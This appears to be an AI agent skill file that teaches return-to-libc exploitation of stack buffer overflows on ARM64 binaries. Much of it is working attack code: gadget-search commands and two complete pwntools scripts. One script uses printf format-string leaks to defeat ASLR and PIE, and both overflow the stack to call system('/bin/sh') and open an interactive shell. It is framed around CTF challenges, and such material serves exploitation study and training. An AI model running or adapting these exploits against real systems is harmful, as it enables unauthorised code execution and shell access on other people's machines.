---
name: ret2lib-arm64-exploitation
description: How to exploit ret2lib vulnerabilities on ARM64 binaries with stack buffer overflows. Use this skill whenever the user mentions ret2lib, ROP exploitation, ARM64 binary exploitation, printf format string leaks, stack buffer overflows on aarch64, or needs to bypass NX/ASLR/PIE protections. This skill covers both non-ASLR scenarios and ASLR/PIE bypass using printf leaks from the stack.
---

# Ret2lib ARM64 Exploitation

A skill for exploiting return-to-libc vulnerabilities on ARM64 binaries with stack buffer overflows.

## When to use this skill

Use this skill when:
- You're working with ARM64/aarch64 binaries with buffer overflow vulnerabilities
- The binary has NX (non-executable stack) enabled
- You need to chain ROP gadgets to call libc functions like `system()`
- ASLR or PIE is enabled and you need to leak addresses via format string vulnerabilities
- You're solving CTF challenges or analyzing vulnerable ARM64 binaries

## Core Concepts

### ARM64 Calling Convention
- **x0-x7**: First 8 function arguments
- **x30**: Link register (return address)
- **sp**: Stack pointer
- **x29**: Frame pointer

### Ret2lib Attack Flow
1. Overflow the buffer to control the return address (x30)
2. Chain ROP gadgets to set up function arguments
3. Jump to libc functions (system, printf, etc.)
4. Bypass ASLR/PIE if enabled using format string leaks

## Exploitation Workflow

### Step 1: Analyze the Binary

```bash
# Check protections
checksec --file ./binary

# Disassemble to find interesting functions
objdump -d ./binary | less

# Find printf, system, and /bin/sh in libc
readelf -s /usr/lib/aarch64-linux-gnu/libc.so.6 | grep -E "printf|system"
strings /usr/lib/aarch64-linux-gnu/libc.so.6 | grep "/bin/sh"
```

### Step 2: Find Stack Offset

Use pattern creation to find where the return address is overwritten:

```bash
# Generate a unique pattern
pattern create 200

# Run the binary with the pattern as input
./binary < /tmp/pattern.txt

# In GDB, after crash, search for the value in x30
pattern search $x30
```

The output tells you the offset from buffer start to the saved return address.

### Step 3: Find ROP Gadgets

Use ropper to find useful gadgets:

```bash
# Find gadgets that load x0 from stack
ropper --file ./binary --search "ldr x0"

# Find gadgets that set up arguments and return
ropper --file ./binary --search "ret"
```

Common useful gadget pattern:
```
ldr x0, [sp, #offset]; ldp x29, x30, [sp], #size; ret
```

This gadget:
- Loads x0 (first argument) from stack at offset
- Restores x29 (frame pointer) and x30 (return address)
- Returns to the address in x30

### Step 4: Build the Payload

#### Non-ASLR Scenario

```python
from pwn import *

p = process('./binary')
libc = ELF("/usr/lib/aarch64-linux-gnu/libc.so.6")
libc.address = 0x0000fffff7df0000  # Known base address

# Find addresses
binsh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]

# Build payload
stack_offset = 108  # From pattern search
ldr_x0_ret = p64(libc.address + 0x6bdf0)  # Gadget address

# Gadget expects: [x29, x30, fill, x0] after itself
x29 = b"AAAAAAAA"  # Dummy frame pointer
x30 = p64(system)   # Return to system
fill = b"A" * (0x18 - 0x10)  # Padding to reach x0 offset
x0 = p64(binsh)     # /bin/sh address

payload = b"A" * stack_offset + ldr_x0_ret + x29 + x30 + fill + x0
p.sendline(payload)
p.interactive()
```

#### ASLR/PIE Bypass with Printf Leak

When ASLR and PIE are enabled, you need to leak addresses first:

**Round 1: Leak PIE base**
1. Use format string vulnerability to leak a binary address
2. Calculate PIE base address
3. Return to main to get another input opportunity

**Round 2: Leak libc and exploit**
1. Leak a libc address via format string
2. Calculate libc base
3. Build ret2system payload

```python
from pwn import *

p = process('./binary')
libc = ELF("/usr/lib/aarch64-linux-gnu/libc.so.6")

def leak_printf(payload, is_main_addr=False):
    """Leak address using format string vulnerability"""
    p.sendlineafter(b">\n", payload)
    response = p.recvline().strip()[2:]  # Remove "0x" prefix
    if is_main_addr:
        response = response[:-4] + b"0000"  # Fix alignment
    return int(response, 16)

def expl_bof(payload):
    p.recv()
    p.sendline(payload)

# Round 1: Leak PIE base
main_address = leak_printf(b"%21$p", True)
print(f"Binary base: {hex(main_address)}")

# Return to main to get another input
stack_offset = 108
main_printf_offset = 0x860  # Offset to printf call in main
ret2main = b"A" * stack_offset + p64(main_address + main_printf_offset)
expl_bof(ret2main)

# Round 2: Leak libc and exploit
libc_leaked = leak_printf(b"%25$p")
libc_base = libc_leaked - 0x26dc4  # Offset from libc base
libc.address = libc_base
print(f"Libc base: {hex(libc_base)}")

binsh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]

# Build ret2system payload
ldr_x0_ret = p64(libc.address + 0x49c40)  # Gadget in libc

x29 = b"AAAAAAAA"
x30 = p64(system)
fill = b"A" * (0x78 - 0x10)  # Adjust for gadget offset
x0 = p64(binsh)

payload = b"A" * stack_offset + ldr_x0_ret + x29 + x30 + fill + x0
p.sendline(payload)
p.interactive()
```

## Key Patterns

### Printf Leak Format
- `%N$p` - Print Nth argument on stack as pointer
- Find offsets by testing different values
- Binary addresses and libc addresses appear at different stack positions

### Gadget Selection Criteria
1. Must load x0 from a controllable stack location
2. Must restore x29 and x30 properly
3. Must end with `ret`
4. Prefer gadgets in libc (more reliable across runs)

### Stack Layout for Gadget
```
[sp]     -> gadget address
[sp+8]   -> x29 (frame pointer, can be dummy)
[sp+10]  -> x30 (return address, e.g., system)
[sp+18]  -> padding (depends on gadget)
[sp+78]  -> x0 (first argument, e.g., /bin/sh)
```

## Common Issues and Solutions

### Issue: Wrong offset calculation
**Solution**: Use `pattern create` and `pattern search` to find exact offset

### Issue: Segmentation fault after payload
**Solution**: Check that x29 is set to a valid value (even if dummy)

### Issue: Printf leak returns garbage
**Solution**: Try different format specifiers (%20$p, %21$p, etc.) until you find valid addresses

### Issue: ASLR still randomizes addresses
**Solution**: Ensure you're leaking addresses before using them, and that libc.address is set correctly

## Testing Checklist

Before finalizing an exploit:
- [ ] Verified stack offset with pattern search
- [ ] Confirmed gadget addresses with ropper
- [ ] Tested printf leak offsets
- [ ] Calculated libc base correctly
- [ ] Verified /bin/sh exists in libc
- [ ] Tested payload locally before remote deployment

## References

- [ROP Gadgets on ARM64](https://github.com/JonathanSalwan/ROPgadget)
- [Pwntools Documentation](https://docs.pwntools.com/)
- [ARM64 Calling Convention](https://developer.arm.com/documentation/102476/0100/)
